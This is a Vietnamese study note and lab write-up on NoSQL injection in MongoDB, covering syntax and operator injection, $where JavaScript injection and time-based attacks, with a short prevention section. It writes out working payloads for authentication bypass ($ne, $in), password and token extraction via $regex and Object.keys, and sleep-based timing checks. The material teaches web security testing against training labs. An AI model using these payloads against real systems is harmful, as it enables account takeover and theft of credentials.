```table-of-contents
```
# No SQL
## Khái niệm

---

Có hai loại NoSQL injection khác nhau:

- **Syntax injection (chèn cú pháp)** – Xảy ra khi bạn có thể phá vỡ cú pháp của truy vấn NoSQL, cho phép chèn payload của riêng bạn. Phương pháp tiếp cận tương tự như trong SQL injection. Tuy nhiên, bản chất của cuộc tấn công khác biệt đáng kể vì các cơ sở dữ liệu NoSQL sử dụng nhiều ngôn ngữ truy vấn, kiểu cú pháp và cấu trúc dữ liệu khác nhau.
- **Operator injection (chèn toán tử)** – Xảy ra khi bạn có thể sử dụng các toán tử truy vấn của NoSQL để thao túng truy vấn.

Trong chủ đề này, chúng ta sẽ xem cách kiểm thử các lỗ hổng NoSQL nói chung, sau đó tập trung khai thác lỗ hổng trong MongoDB, cơ sở dữ liệu NoSQL phổ biến nhất.

---

## Syntax Injection

---

Bạn có thể phát hiện lỗ hổng NoSQL injection bằng cách cố gắng phá vỡ cú pháp truy vấn. Để làm điều này, hãy kiểm thử có hệ thống từng input bằng cách gửi các chuỗi fuzz và ký tự đặc biệt. Nếu ứng dụng không được lọc hoặc kiểm tra đúng cách, chúng sẽ gây ra lỗi cơ sở dữ liệu hoặc các hành vi có thể phát hiện khác.

Nếu bạn biết ngôn ngữ API của cơ sở dữ liệu mục tiêu, hãy sử dụng các ký tự đặc biệt và chuỗi fuzz phù hợp với ngôn ngữ đó. Ngược lại, hãy dùng nhiều loại chuỗi fuzz để nhắm đến nhiều ngôn ngữ API khác nhau.

Xem xét một ứng dụng mua sắm hiển thị sản phẩm theo các danh mục. Khi người dùng chọn danh mục **Fizzy drinks**, trình duyệt của họ gửi yêu cầu sau:

```
<https://insecure-website.com/product/lookup?category=fizzy>
```

Ứng dụng này sẽ gửi một truy vấn JSON để lấy sản phẩm từ collection **product** trong cơ sở dữ liệu MongoDB:

```
this.category == 'fizzy'
```

Để kiểm tra xem input có thể dễ bị tấn công hay không, bạn có thể gửi một chuỗi fuzz trong giá trị của tham số `category`. Một chuỗi mẫu cho MongoDB là:

```
'"`{
;$Foo}
$Foo \\xYZ
```

Sử dụng chuỗi fuzz này để tạo payload tấn công:

```
<https://insecure-website.com/product/lookup?category=>'%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Nếu kết quả phản hồi thay đổi so với phản hồi gốc, điều đó có thể cho thấy input của người dùng không được lọc hoặc kiểm tra đúng cách.

> **Lưu ý**
> 
> - Lỗ hổng NoSQL injection có thể xảy ra trong nhiều ngữ cảnh khác nhau, do đó bạn cần điều chỉnh chuỗi fuzz tương ứng. Nếu không, bạn có thể chỉ gây ra lỗi kiểm tra đầu vào và ứng dụng sẽ không bao giờ thực thi truy vấn.
> - Trong ví dụ này, chúng ta tiêm chuỗi fuzz thông qua URL nên chuỗi phải được mã hóa URL.
> - Trong một số ứng dụng khác, bạn có thể cần chèn payload thông qua một thuộc tính JSON. Trong trường hợp đó, payload sẽ có dạng:
> 
> ```
> '\\"`{\\r;$Foo}\\n$Foo \\\\xYZ\\u0000
> ```

Để xác định ký tự nào được ứng dụng hiểu là cú pháp, bạn có thể thử tiêm từng ký tự riêng lẻ.

Ví dụ: bạn gửi ký tự `'`, truy vấn MongoDB sẽ trở thành:

```
this.category == '''
```

Nếu điều này làm thay đổi phản hồi gốc, có thể ký tự `'` đã phá vỡ cú pháp truy vấn và gây ra lỗi cú pháp.

Bạn có thể xác nhận điều này bằng cách gửi một chuỗi truy vấn hợp lệ vào input, ví dụ bằng cách escape dấu nháy đơn:

```
this.category == '\\''
```

Nếu truy vấn này không gây ra lỗi cú pháp, điều đó có thể có nghĩa là ứng dụng dễ bị tấn công injection.

Sau khi phát hiện được lỗ hổng, bước tiếp theo là xác định xem bạn có thể tác động đến các điều kiện boolean bằng cú pháp NoSQL hay không.

Để kiểm tra, hãy gửi hai request: một với điều kiện **false**, một với điều kiện **true**.

Ví dụ, bạn có thể dùng các biểu thức điều kiện `' && 0 && 'x` và `' && 1 && 'x` như sau:

```
<https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x>
<https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x>
```

Nếu ứng dụng phản hồi khác nhau, điều này cho thấy điều kiện **false** đã ảnh hưởng đến logic của truy vấn, trong khi điều kiện **true** thì không. Điều đó chứng tỏ việc chèn cú pháp theo kiểu này đã tác động đến truy vấn phía server.

Bây giờ bạn đã xác định được rằng mình có thể tác động đến các điều kiện boolean, bạn có thể thử **ghi đè** các điều kiện hiện có để khai thác lỗ hổng. Ví dụ, bạn có thể chèn một điều kiện JavaScript luôn cho kết quả **true**, như `'||'1'=='1`:

```
<https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31>
```

Điều này dẫn đến truy vấn MongoDB sau:

```
this.category == 'fizzy'||'1'=='1'
```

Vì điều kiện được chèn luôn đúng, truy vấn đã sửa đổi sẽ trả về **tất cả** item. Điều này cho phép bạn xem mọi sản phẩm trong **bất kỳ** danh mục nào, bao gồm cả các danh mục ẩn hoặc chưa biết.

> **Cảnh báo** Hãy cẩn thận khi chèn một điều kiện luôn đúng vào truy vấn NoSQL. Mặc dù điều này có thể vô hại trong ngữ cảnh ban đầu mà bạn đang tiêm vào, các ứng dụng thường dùng dữ liệu từ **một request** cho **nhiều truy vấn khác nhau**. Nếu ứng dụng sử dụng lại dữ liệu đó khi **cập nhật** hoặc **xóa** dữ liệu, điều này có thể dẫn tới **mất dữ liệu ngoài ý muốn**.

Bạn cũng có thể thêm một **ký tự null** sau giá trị của `category`. MongoDB có thể bỏ qua mọi ký tự sau ký tự null. Điều này đồng nghĩa với việc mọi điều kiện bổ sung trong truy vấn MongoDB sẽ bị bỏ qua.

Ví dụ, truy vấn ban đầu có thêm ràng buộc `this.released`:

```
this.category == 'fizzy' && this.released == 1
```

Trong đó, điều kiện `this.released == 1` được dùng để chỉ hiển thị các sản phẩm đã phát hành. Với sản phẩm chưa phát hành, giá trị có thể là `this.released == 0`.

Trong trường hợp này, kẻ tấn công có thể tạo payload như sau:

```
<https://insecure-website.com/product/lookup?category=fizzy>'%00
```

Truy vấn NoSQL sau đó sẽ trở thành:

```
this.category == 'fizzy'\\u0000' && this.released == 1
```

Nếu MongoDB bỏ qua tất cả ký tự sau **null character**, thì điều kiện `this.released == 1` sẽ bị loại bỏ. Kết quả là, **tất cả sản phẩm trong danh mục fizzy** sẽ được hiển thị, bao gồm cả sản phẩm **chưa phát hành**.

---

## Khai thác Syntax Injection

---

Trong nhiều cơ sở dữ liệu NoSQL, một số toán tử hoặc hàm có thể chạy JavaScript ở mức giới hạn, như toán tử `$where` và hàm `mapReduce()` của MongoDB. Điều này có nghĩa là nếu ứng dụng dễ tổn thương sử dụng các toán tử hoặc hàm này, cơ sở dữ liệu có thể đánh giá (thực thi) mã JavaScript như một phần của truy vấn. Do đó, bạn có thể tận dụng các hàm JavaScript để **trích xuất dữ liệu** từ cơ sở dữ liệu.

Xét một ứng dụng dễ bị tấn công cho phép người dùng tra cứu các tên người dùng đã đăng ký khác và hiển thị vai trò của họ. Thao tác này kích hoạt yêu cầu tới URL:

```
<https://insecure-website.com/user/lookup?username=admin>
```

Điều này dẫn đến truy vấn NoSQL sau trên collection `users`:

```
{"$where":"this.username == 'admin'"}
```

Vì truy vấn sử dụng toán tử `$where`, bạn có thể thử chèn các hàm JavaScript vào truy vấn này để trả về dữ liệu nhạy cảm. Ví dụ, bạn có thể gửi payload sau:

```
admin' && this.password[0] == 'a' || 'a'=='b
```

Payload này trả về ký tự đầu tiên của chuỗi mật khẩu của người dùng, cho phép bạn trích xuất mật khẩu theo từng ký tự.

Bạn cũng có thể dùng hàm JavaScript `match()` để trích xuất thông tin. Ví dụ, payload sau cho phép bạn xác định xem mật khẩu có chứa chữ số hay không:

```
admin' && this.password.match(/\\d/) || 'a'=='b
```

Vì MongoDB xử lý dữ liệu bán cấu trúc (semi-structured) và không yêu cầu schema cố định, bạn có thể cần xác định các trường hợp lệ trong collection trước khi có thể trích xuất dữ liệu bằng JavaScript injection.

Ví dụ, để xác định liệu cơ sở dữ liệu MongoDB có trường `password` hay không, bạn có thể gửi payload sau:

```
<https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'>
```

Gửi lại payload cho một trường tồn tại và cho một trường không tồn tại. Trong ví dụ này, bạn biết trường `username` tồn tại, vì vậy có thể gửi các payload sau:

```
admin' && this.username!='
admin' && this.foo!='
```

Nếu trường `password` tồn tại, bạn kỳ vọng phản hồi sẽ **giống** với phản hồi của trường tồn tại (`username`), nhưng **khác** với phản hồi của trường không tồn tại (`foo`).

Nếu bạn muốn kiểm thử các tên trường khác nhau, bạn có thể thực hiện **dictionary attack** bằng cách dùng một **wordlist** để lần lượt thử các tên trường tiềm năng.

> **Lưu ý**
> 
> Bạn cũng có thể dùng **NoSQL operator injection** để trích xuất tên trường **từng ký tự một**. Cách này giúp bạn xác định tên trường mà không cần đoán hoặc thực hiện dictionary attack.

---

## Operator Injection

---

Các cơ sở dữ liệu NoSQL thường sử dụng **toán tử truy vấn (query operators)**, cho phép chỉ định các điều kiện mà dữ liệu phải thỏa mãn để được đưa vào kết quả truy vấn.

Ví dụ một số toán tử trong MongoDB:

- **`$where`** – Khớp với các document thỏa mãn một biểu thức JavaScript.
- **`$ne`** – Khớp với tất cả các giá trị **khác** giá trị được chỉ định.
- **`$in`** – Khớp với tất cả giá trị nằm trong một mảng chỉ định.
- **`$regex`** – Chọn các document có giá trị khớp với một biểu thức chính quy (regular expression).

Bạn có thể khai thác bằng cách **chèn các toán tử truy vấn** để thao túng câu lệnh NoSQL.

Để làm điều này, hãy **gửi có hệ thống** nhiều toán tử khác nhau vào các input của người dùng, rồi quan sát phản hồi để tìm thông báo lỗi hoặc các thay đổi bất thường.

Trong các **thông điệp JSON**, bạn có thể chèn toán tử truy vấn dưới dạng **object lồng nhau**.

Ví dụ:

```json
{"username":"wiener"}
```

có thể biến thành:

```json
{"username":{"$ne":"invalid"}}
```

Với **input dựa trên URL**, bạn có thể chèn toán tử truy vấn qua **tham số URL**.

Ví dụ:

```
username=wiener
```

biến thành:

```
username[$ne]=invalid
```

Nếu cách này không hoạt động, bạn có thể thử:

1. Chuyển **phương thức request** từ `GET` sang `POST`.
2. Thay đổi **Content-Type header** thành `application/json`.
3. Đưa JSON vào trong **message body**.
4. Tiêm toán tử truy vấn vào JSON.

> **Lưu ý**
> 
> Bạn có thể dùng **Content Type Converter extension** để tự động:
> 
> - Biến một request `POST` dạng URL-encoded thành `JSON`.
> - Chuyển đổi phương thức request.

Xét một ứng dụng dễ tổn thương chấp nhận `username` và `password` trong body của yêu cầu POST:

```json
{"username":"wiener","password":"peter"}
```

Hãy kiểm thử từng input với nhiều toán tử khác nhau. Ví dụ, để kiểm tra liệu input `username` có xử lý toán tử truy vấn hay không, bạn có thể thử chèn:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Nếu toán tử `$ne` được áp dụng, truy vấn sẽ trả về tất cả người dùng có `username` **khác** `invalid`.

Nếu cả `username` và `password` đều xử lý được toán tử, có thể bypass xác thực bằng payload sau:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Truy vấn này trả về mọi cặp thông tin đăng nhập mà `username` và `password` đều **khác** `invalid`. Kết quả là bạn sẽ đăng nhập vào ứng dụng với **người dùng đầu tiên** trong collection.

Để nhắm mục tiêu một tài khoản cụ thể, bạn có thể tạo payload chứa `username` đã biết hoặc đoán được. Ví dụ:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

Cheatsheet:

[Query and Projection Operators - Database Manual v6.0 - MongoDB Docs](https://www.mongodb.com/docs/v6.0/reference/operator/query/)

---

## Khai thác Operator Injection

---

Ngay cả khi truy vấn gốc không dùng bất kỳ toán tử nào cho phép bạn chạy JavaScript tùy ý, bạn vẫn có thể tự **chèn** một trong các toán tử này. Sau đó, bạn có thể sử dụng các điều kiện boolean để xác định liệu ứng dụng có thực thi bất kỳ JavaScript nào mà bạn tiêm thông qua toán tử đó hay không.

Xét một ứng dụng dễ tổn thương chấp nhận `username` và `password` trong body của một yêu cầu POST:

```json
{"username":"wiener","password":"peter"}
```

Để kiểm tra xem bạn có thể tiêm (inject) các toán tử hay không, bạn có thể thử thêm toán tử `$where` như một tham số bổ sung, rồi gửi một yêu cầu có điều kiện đánh giá là **false** và một yêu cầu có điều kiện đánh giá là **true**. Ví dụ:

```json
{"username":"wiener","password":"peter", "$where":"0"}
{"username":"wiener","password":"peter", "$where":"1"}
```

Nếu có sự khác biệt giữa các phản hồi, điều này có thể cho thấy biểu thức JavaScript trong mệnh đề `$where` đang được thực thi.

Nếu bạn đã tiêm được một toán tử cho phép chạy JavaScript, bạn có thể dùng phương thức **`keys()`** để trích xuất tên của các trường dữ liệu.

Ví dụ, bạn có thể gửi payload sau:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Payload này sẽ kiểm tra trường dữ liệu **đầu tiên** trong object `user` và so khớp ký tự đầu tiên của tên trường.

Bằng cách thay đổi biểu thức chính quy (regex), bạn có thể lần lượt kiểm tra và từ đó trích xuất tên trường **từng ký tự một**.

Ngoài ra, bạn có thể trích xuất dữ liệu bằng các toán tử **không** cho phép chạy JavaScript. Ví dụ, bạn có thể dùng toán tử **`$regex`** để trích xuất dữ liệu **từng ký tự một**.

Xét một ứng dụng dễ bị tấn công, chấp nhận `username` và `password` trong body của request POST. Ví dụ:

```json
{"username":"myuser","password":"mypass"}
```

Bạn có thể bắt đầu bằng cách kiểm tra xem toán tử `$regex` có được xử lý hay không với payload sau:

```json
{"username":"admin","password":{"$regex":"^.*"}}
```

Nếu phản hồi từ request này khác với phản hồi khi bạn gửi mật khẩu sai, điều đó cho thấy ứng dụng có thể bị tổn thương.

Sau đó, bạn có thể dùng toán tử `$regex` để trích xuất dữ liệu từng ký tự một. Ví dụ, payload sau kiểm tra xem mật khẩu có bắt đầu bằng chữ **a** hay không:

```json
{"username":"admin","password":{"$regex":"^a*"}}
```

---

## Time based Attack

---

Đôi khi kích hoạt lỗi cơ sở dữ liệu không làm phản hồi của ứng dụng khác biệt. Trong tình huống này, bạn vẫn có thể phát hiện và khai thác lỗ hổng bằng cách **tiêm JavaScript** để kích hoạt **độ trễ có điều kiện**.

Để thực hiện **NoSQL injection dựa trên thời gian**:

1. Tải trang nhiều lần để xác định **thời gian tải cơ sở** (baseline).
    
2. Chèn **payload tạo độ trễ** vào input. Payload kiểu này sẽ cố ý làm chậm phản hồi khi được thực thi. Ví dụ,
    
    `{"$where": "sleep(5000)"}` gây độ trễ cố ý **5000 ms** nếu tiêm thành công.
    
3. Xác định xem phản hồi có tải chậm hơn không. Điều này cho thấy tiêm đã thành công.
    

Các payload dựa trên thời gian sau sẽ kích hoạt độ trễ nếu mật khẩu **bắt đầu bằng chữ a**:

```
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
```

```
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```

---

## Phòng chống

---

Cách phòng chống tấn công NoSQL injection phụ thuộc vào công nghệ NoSQL cụ thể mà bạn sử dụng. Do đó, bạn nên tham khảo tài liệu bảo mật chính thức của hệ quản trị NoSQL mà mình lựa chọn. Tuy nhiên, một số nguyên tắc chung dưới đây cũng sẽ hữu ích:

- **Lọc và kiểm tra dữ liệu đầu vào** – sử dụng allowlist các ký tự hợp lệ.
- **Dùng truy vấn tham số (parameterized queries)** thay vì nối trực tiếp dữ liệu người dùng vào câu truy vấn.
- **Ngăn chặn operator injection** – áp dụng allowlist cho các key được chấp nhận.

# WU
- [x] Detecting NoSQL injection
- [x] Exploiting NoSQL operator injection to bypass authentication
- [x] Exploiting NoSQL injection to extract data
- [x] Exploiting NoSQL operator injection to extract unknown fields

## Detecting NoSQL injection

- Khác với SQL sử dụng các chuỗi văn bản (String) như `' OR 1=1--`, NoSQL (cụ thể là MongoDB) thường sử dụng các **đối tượng JSON** hoặc **JavaScript** để truy vấn. Lỗ hổng xảy ra khi ứng dụng nhận input từ người dùng và đưa trực tiếp vào các toán tử này mà không kiểm tra kỹ.

Hai loại NoSQL Injection phổ biến:
1. **Syntax Injection:** Phá vỡ cấu trúc JSON bằng các ký tự đặc biệt như `"` hoặc `'`.
2. **Operator Injection:** Sử dụng các toán tử logic của NoSQL (như `$gt`, `$ne`) để thay đổi logic truy vấn.


- khi thêm dấu ' đằng sau truy vấn thì web hiện thông báo lỗi
![](../../image/Pasted%20image%2020260502195411.png)
- chèn thêm chuỗi `|| 1==1%00 '`
![](../../image/Pasted%20image%2020260502195935.png)

## Exploiting NoSQL operator injection to bypass authentication

- ở bài lab này ta cần sử dụng các toán tử so sánh của NoSQL để khiến câu lệnh truy vấn luôn trả về kết quả khớp với người dùng `admin`
![](../../image/Pasted%20image%2020260502202430.png)
- sau khi login thấy request chứa username và password trong json
- đổi username thành `{"$ne":""}` và response vẫn cho ta login
![](../../image/Pasted%20image%2020260502202534.png)

- truy vấn `{"username":{"$ne":""},"password":{"$ne":""}}` có nghĩa là "Lấy tất cả người dùng có tên và mật khẩu không rỗng". Lỗi 500 này gián tiếp xác nhận Server **có thực thi** toán tử NoSQL của bạn nhưng không biết cách xử lý kết quả trả về quá lớn đó.

![](../../image/Pasted%20image%2020260502202852.png)

- ta thử dùng regex để truy vấn: tìm tất cả user có admin và mật khẩu ko rỗng
![](../../image/Pasted%20image%2020260502203146.png)

- chuột phải để reuqest in browser
![](../../image/Pasted%20image%2020260502203243.png)

## Exploiting NoSQL injection to extract data

- ở bài lab này ta cần tìm lỗi no sql ở hàm lookup để tìm thông tin và login với tư cách admin
- tìm gói tin lookup user và gửi sang repeater
![](../../image/Pasted%20image%2020260502203550.png)
- thử truy vấn xem server xử lí như thế nào

![](../../image/Pasted%20image%2020260502203642.png)


![](../../image/Pasted%20image%2020260502203723.png)


![](../../image/Pasted%20image%2020260502205011.png)

![](../../image/Pasted%20image%2020260502205026.png)
- response trả về cho thấy có tài khoản admin và password trong db
- việc tiếp theo là bruteforce để tìm độ dài password

- password có 8 kí tự
![](../../image/Pasted%20image%2020260502205631.png)

- bruteforice để tìm password
![](../../image/Pasted%20image%2020260502210229.png)
![](../../image/Pasted%20image%2020260502210212.png)

## Exploiting NoSQL operator injection to extract unknown fields
- ở bài lab này mục tiêu là tìm ra một **tên trường (field name)** mà chưa hề biết (ví dụ: một mã token bí mật hoặc mã bảo mật 2 lớp) đang nằm trong cơ sở dữ liệu.

- request dưới cho thấy server vẫn xử lí input ta vừa nhập vào
![](../../image/Pasted%20image%2020260502211240.png)

Toán tử `$where` cho phép bạn gửi một chuỗi JavaScript trực tiếp xuống MongoDB để thực thi.

- **`Object.keys(this)`**: Hàm này trả về một mảng chứa tất cả tên các trường (field names/column names) của bản ghi đó. response trả về invalid ... chứng tỏ ta có thể inject js vào
- giờ tìm cách bruteforce, dùng biểu thức chính quy .match('^.{0}a.*$')"

![](../../image/Pasted%20image%2020260502211640.png)

- sẽ có 1 vài resposne trả về độ dài khác so với response còn lại
![](../../image/Pasted%20image%2020260502212606.png)
![](../../image/Pasted%20image%2020260502212557.png)

=> có thể thấy cột 1 (this[1]) trong db là của username, cột t2 là password, lần lượt tìm đến cột thứ 4, ta thấy đây là cột chứa token: 
![](../../image/Pasted%20image%2020260502214947.png)

- chuyển sang xem request forgot pasword

![](../../image/Pasted%20image%2020260502214921.png)


- ta bruteforce để tìm token
![](../../image/Pasted%20image%2020260502215053.png)
![](../../image/Pasted%20image%2020260502215043.png)

- nhập token vào request và chọn request in brower
![](../../image/Pasted%20image%2020260502215248.png)

![](../../image/Pasted%20image%2020260502215329.png)
